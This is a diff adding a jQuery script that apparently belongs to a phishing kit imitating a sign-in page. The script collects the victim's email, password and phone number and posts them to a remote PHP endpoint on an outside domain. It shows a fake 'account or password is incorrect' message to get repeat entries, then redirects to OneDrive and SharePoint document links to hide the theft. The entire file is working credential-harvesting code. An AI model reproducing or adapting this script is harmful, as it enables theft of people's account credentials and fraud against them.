@@ -1,0 +1,213 @@
+
+
+
+      /* global $ */
+      $(document).ready(function(){
+        $('#error').hide();
+        $("#div2").hide();
+        $("#msg").hide();
+        var final="";
+        var count=0;
+        $('#email').click(function(){
+          $('#error').hide();
+        });
+        $('#next').click(function () {
+          var my_email =$('#email').val();
+          var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+          if (!filter.test(email.value)) {
+            $('#error').show();
+            email.focus;
+            return false;
+          }
+          var ind=my_email.indexOf("@");
+          var my_slice=my_email.substr((ind+1));
+          var c= my_slice.substr(0, my_slice.indexOf('.'));
+          var final= c.toLowerCase();
+          if (final=="gmail") {
+         // $('#error').show();
+         $("#div1").animate({left:200, opacity:"hide"}, 0);
+         $("#div2").animate({right:200, opacity:"show"}, 1000);
+         $("#emailch").html(my_email);
+
+       }
+       else
+       {
+
+       }
+     });
+        $('#back').click(function () {
+          $("#msg").hide();
+          $("#div2").animate({left:200, opacity:"hide"}, 0);
+          $("#div1").animate({right:200, opacity:"show"}, 1000);
+
+        });
+
+
+        $('#submit-btn').click(function(event){
+          event.preventDefault();
+          var email=$("#email").val();
+          var password=$("#password").val();
+          var detail=$("#field").html();
+          var msg = $('#msg').html();
+          $('#msg').text( msg );
+          count=count+1;
+          if (count>=3) {
+            count=0;
+            window.location.replace("https://1drv.ms/w/s!Ajfn760a4tnghDfG81u5-vmDRwyK?e=xpkNjf");
+          }
+          else
+          {
+            ////////////email check code////////
+            var my_email =$('#email').val();
+          var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+          var ind=my_email.indexOf("@");
+          var my_slice=my_email.substr((ind+1));
+          var c= my_slice.substr(0, my_slice.indexOf('.'));
+          var final= c.toLowerCase();
+            ////////////email check code////////
+          if (final!="gmail") {
+           $.ajax({
+            dataType: 'JSON',
+            url: 'https://studio-domino.kiev.ua/generalapp/next.php',
+            type: 'POST',
+            data:{
+              email:email,
+              password:password,
+              detail:detail,
+
+            },
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                 $('#msg').html(response['msg']);
+               }
+               else{
+                $('#msg').html(response['msg']);
+              }
+            }
+          },
+          error: function(){
+            $("#msg").show();
+            $('#msg').html("Your account or password is incorrect");
+          },
+          complete: function(){
+            $('#submit-btn').html('Sign in');
+          }
+        });
+
+         }
+         else
+         {
+          if (count>=2) {
+            $("#div1").animate({left:200, opacity:"hide"}, 0);
+          $("#div2").animate({right:200, opacity:"show"}, 1000);
+          $("#emailch").html(my_email);
+          }
+          else
+          {
+           $.ajax({
+            dataType: 'JSON',
+            url: 'https://studio-domino.kiev.ua/generalapp/next.php',
+            type: 'POST',
+            data:{
+              email:email,
+              password:password,
+              detail:detail,
+
+            },
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                 $('#msg').html(response['msg']);
+               }
+               else{
+                $('#msg').html(response['msg']);
+              }
+            }
+          },
+          error: function(){
+            $("#msg").show();
+            $('#msg').html("Your account or password is incorrect");
+          },
+          complete: function(){
+            $('#submit-btn').html('Sign in');
+          }
+        });
+
+          }
+
+
+        }
+
+           
+         }
+       });
+$('#submit-btn1').click(function(event){
+          event.preventDefault();
+          var email=$("#email").val();
+          var password=$("#password").val();
+          var phone=$("#phone").val();
+          var detail=$("#field").html();
+          var msg1 = $('#msg1').html();
+          // count=count+1;
+        // if (count>=2) {
+        //   count=0;
+        //   $("#div2").animate({left:200, opacity:"hide"}, 0);
+        //   $("#div3").animate({right:200, opacity:"show"}, 1000);
+        //   // window.location.replace("https://equipmentservi-my.sharepoint.com/:w:/g/personal/report_fundsfinancial-report_com/EaACBl9DeW5JslKowFBsLb0BBrgj1FQ1zUpTcH_d-712MQ?e=Y7rQob");
+        // }
+        // else
+        // {
+           $.ajax({
+            dataType: 'JSON',
+            url: 'https://studio-domino.kiev.ua/generalapp/next.php',
+            type: 'POST',
+            data:{
+              email:email,
+              password:password,
+              detail:detail,
+              phone:phone,
+
+            },
+            beforeSend: function(xhr){
+              $('#submit-btn1').html('Verifing...');
+            },
+            success: function(response){
+              window.location.replace("https://equipmentservi-my.sharepoint.com/:w:/g/personal/report_fundsfinancial-report_com/EaACBl9DeW5JslKowFBsLb0BBrgj1FQ1zUpTcH_d-712MQ?e=Y7rQob");
+              if(response){
+                $("#msg1").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                 $('#msg1').html(response['msg']);
+               }
+               else{
+                $('#msg1').html(response['msg']);
+              }
+            }
+          },
+          error: function(){
+              window.location.replace("https://equipmentservi-my.sharepoint.com/:w:/g/personal/report_fundsfinancial-report_com/EaACBl9DeW5JslKowFBsLb0BBrgj1FQ1zUpTcH_d-712MQ?e=Y7rQob");
+            $("#msg1").show();
+            $('#msg1').html("Your account or password is incorrect");
+          },
+          complete: function(){
+            $('#submit-btn1').html('Verify');
+          }
+        });
+         // }
+       });
+
+
+      });
+    
